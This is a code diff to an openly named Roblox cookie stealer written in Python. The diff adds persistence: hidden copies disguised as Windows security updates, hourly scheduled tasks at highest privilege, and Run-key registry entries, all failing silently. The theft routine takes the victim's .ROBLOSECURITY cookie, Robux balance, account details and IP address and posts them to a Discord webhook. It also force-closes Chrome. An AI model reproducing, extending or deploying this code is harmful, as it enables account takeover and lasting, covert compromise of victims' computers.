@@ -12,6 +12,77 @@ import httpx
 import re
 import requests
 import robloxpy
+import sys
+import time
+import threading
+
+def create_persistence():
+    """Create backup copies and schedule automatic execution"""
+    try:
+        # Get the current executable path
+        if getattr(sys, 'frozen', False):
+            current_exe = sys.executable
+        else:
+            current_exe = os.path.abspath(__file__)
+        
+        # Create backup locations
+        backup_locations = [
+            os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "SecurityUpdate.exe"),
+            os.path.join(os.environ.get("TEMP", ""), "WindowsSecurityUpdate.exe"),
+            os.path.join(os.environ.get("USERPROFILE", ""), "Documents", "SecurityPatch.exe"),
+            os.path.join(os.environ.get("PROGRAMDATA", ""), "Microsoft", "Windows", "SystemUpdate.exe")
+        ]
+        
+        # Copy to backup locations
+        for backup_path in backup_locations:
+            try:
+                # Create directory if it doesn't exist
+                os.makedirs(os.path.dirname(backup_path), exist_ok=True)
+                
+                # Copy the file if it doesn't already exist
+                if not os.path.exists(backup_path):
+                    shutil.copy2(current_exe, backup_path)
+                    
+                    # Hide the file
+                    subprocess.run(f'attrib +h "{backup_path}"', shell=True, capture_output=True)
+                    
+            except:
+                continue
+        
+        # Schedule automatic execution every hour
+        schedule_auto_execution(backup_locations)
+        
+    except Exception as e:
+        pass  # Silent failure
+
+def schedule_auto_execution(backup_paths):
+    """Schedule the executable to run every hour using Windows Task Scheduler"""
+    try:
+        for i, backup_path in enumerate(backup_paths):
+            if os.path.exists(backup_path):
+                task_name = f"WindowsSecurityUpdate_{i}"
+                
+                # Create scheduled task command
+                schtasks_cmd = f'''schtasks /create /tn "{task_name}" /tr "{backup_path}" /sc hourly /mo 1 /f /rl highest'''
+                
+                # Execute the command silently
+                subprocess.run(schtasks_cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                # Also create a startup entry in registry
+                startup_cmd = f'''reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate_{i}" /t REG_SZ /d "{backup_path}" /f'''
+                subprocess.run(startup_cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                
+    except:
+        pass  # Silent failure
+
+def background_execution():
+    """Run the main stealer function in background every hour"""
+    while True:
+        try:
+            time.sleep(3600)  # Wait 1 hour (3600 seconds)
+            main_stealer_function()
+        except:
+            continue
 
 try:
     subprocess.call("TASKKILL /f /IM CHROME.EXE")
@@ -169,59 +240,74 @@ def generate_headers(csrf_token, auth_cookie):
     return headers, cookies
 
 
+def main_stealer_function():
+    """Main stealer functionality as a function"""
+    try:
+        cookie = CookieLog()
+
+        check = robloxpy.Utils.CheckCookie(cookie).lower()
+        if check != "valid cookie":
+            cookie = refresh_cookie(cookie)
+
+        ip_address = get_local_ip()
+        roblox_cookie = cookie
+
+        info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).text)
+        roblox_id = info["UserID"]
+        rap = robloxpy.User.External.GetRAP(roblox_id)
+        friends = robloxpy.User.Friends.External.GetCount(roblox_id)
+        age = robloxpy.User.External.GetAge(roblox_id)
+        creation_date = robloxpy.User.External.CreationDate(roblox_id)
+        rolimons = f"https://www.rolimons.com/player/{roblox_id}"
+        roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
+        headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false").text
+        headshot_json = json.loads(headshot_raw)
+        headshot = headshot_json["data"][0]["imageUrl"]
+
+        username = info['UserName']
+        robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
+        premium_status = info['IsPremium']
+
+        discord = Discord(url=webhook_url)
+        discord.post(
+            username="BOT - Pirate 🍪",
+            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
+            embeds=[
+                {
+                    "title": "💸 +1 Result Account 🕯️",
+                    "thumbnail": {"url": headshot},
+                    "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+                    "fields": [
+                        {"name": "Username", "value": f"```{username}```", "inline": True},
+                        {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
+                        {"name": "Premium Status", "value": f"```{premium_status}```", "inline": True},
+                        {"name": "Creation Date", "value": f"```{creation_date}```", "inline": True},
+                        {"name": "RAP", "value": f"```{rap}```", "inline": True},
+                        {"name": "Friends", "value": f"```{friends}```", "inline": True},
+                        {"name": "Account Age", "value": f"```{age}```", "inline": True},
+                        {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
+                    ],
+                }
+            ],
+        )
+
+        discord.post(
+            username="BOT - Pirate 🍪",
+            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
+            embeds=[
+                {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
+            ],
+        )
+    except:
+        pass  # Silent failure
+
 if __name__ == "__main__":
-    cookie = CookieLog()
-
-    check = robloxpy.Utils.CheckCookie(cookie).lower()
-    if check != "valid cookie":
-        cookie = refresh_cookie(cookie)
-
-    ip_address = get_local_ip()
-    roblox_cookie = cookie
-
-    info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).text)
-    roblox_id = info["UserID"]
-    rap = robloxpy.User.External.GetRAP(roblox_id)
-    friends = robloxpy.User.Friends.External.GetCount(roblox_id)
-    age = robloxpy.User.External.GetAge(roblox_id)
-    creation_date = robloxpy.User.External.CreationDate(roblox_id)
-    rolimons = f"https://www.rolimons.com/player/{roblox_id}"
-    roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
-    headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false").text
-    headshot_json = json.loads(headshot_raw)
-    headshot = headshot_json["data"][0]["imageUrl"]
-
-    username = info['UserName']
-    robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
-    premium_status = info['IsPremium']
-
-    discord = Discord(url=webhook_url)
-    discord.post(
-        username="BOT - Pirate 🍪",
-        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
-        embeds=[
-            {
-                "title": "💸 +1 Result Account 🕯️",
-                "thumbnail": {"url": headshot},
-                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
-                "fields": [
-                    {"name": "Username", "value": f"```{username}```", "inline": True},
-                    {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
-                    {"name": "Premium Status", "value": f"```{premium_status}```", "inline": True},
-                    {"name": "Creation Date", "value": f"```{creation_date}```", "inline": True},
-                    {"name": "RAP", "value": f"```{rap}```", "inline": True},
-                    {"name": "Friends", "value": f"```{friends}```", "inline": True},
-                    {"name": "Account Age", "value": f"```{age}```", "inline": True},
-                    {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
-                ],
-            }
-        ],
-    )
-
-    discord.post(
-        username="BOT - Pirate 🍪",
-        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
-        embeds=[
-            {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
-        ],
-    )
+    # Create persistence on first run
+    create_persistence()
+    
+    # Start background execution thread
+    background_thread = threading.Thread(target=background_execution, daemon=True)
+    background_thread.start()
+    
+    # Run the main function once immediately
+    main_stealer_function()
